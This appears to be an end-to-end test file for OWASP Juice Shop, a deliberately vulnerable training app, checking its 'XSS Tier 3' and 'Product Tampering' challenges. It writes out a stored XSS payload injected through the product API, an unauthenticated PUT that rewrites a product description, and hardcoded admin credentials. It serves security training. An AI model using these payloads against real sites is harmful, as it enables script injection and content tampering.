'use strict'

describe('/rest', function () {
  describe('challenge "xss3"', function () {
    protractor.beforeEach.login({email: 'admin@juice-sh.op', password: 'admin123'})

    it('should be possible to create a new product when logged in', function () {
      var EC = protractor.ExpectedConditions

      browser.executeScript('var $http = angular.injector([\'juiceShop\']).get(\'$http\'); $http.post(\'/api/Products\', {name: \'XSS3\', description: \'<script>alert("XSS3")</script>\', price: 47.11});')

      browser.get('/#/search')
      browser.wait(EC.alertIsPresent(), 5000, "'XSS3' alert is not present")
      browser.switchTo().alert().then(
                function (alert) {
                  expect(alert.getText()).toEqual('XSS3')
                  alert.accept()

                  browser.ignoreSynchronization = true
                  browser.executeScript('var $http = angular.injector([\'juiceShop\']).get(\'$http\'); $http.put(\'/api/Products/20\', {description: \'alert disabled\'});')
                  browser.driver.sleep(1000)
                  browser.ignoreSynchronization = false
                })
    })

    protractor.expect.challengeSolved({challenge: 'XSS Tier 3'})
  })

  describe('challenge "changeProduct"', function () {
    it('should be possible to change product via PUT request without being logged in', function () {
      browser.ignoreSynchronization = true
      browser.executeScript('var $http = angular.injector([\'juiceShop\']).get(\'$http\'); $http.put(\'/api/Products/8\', {description: \'<a href="http://kimminich.de" target="_blank">More...</a>\'});')
      browser.driver.sleep(1000)
      browser.ignoreSynchronization = false
      browser.get('/#/search')
    })

    protractor.expect.challengeSolved({challenge: 'Product Tampering'})
  })
})
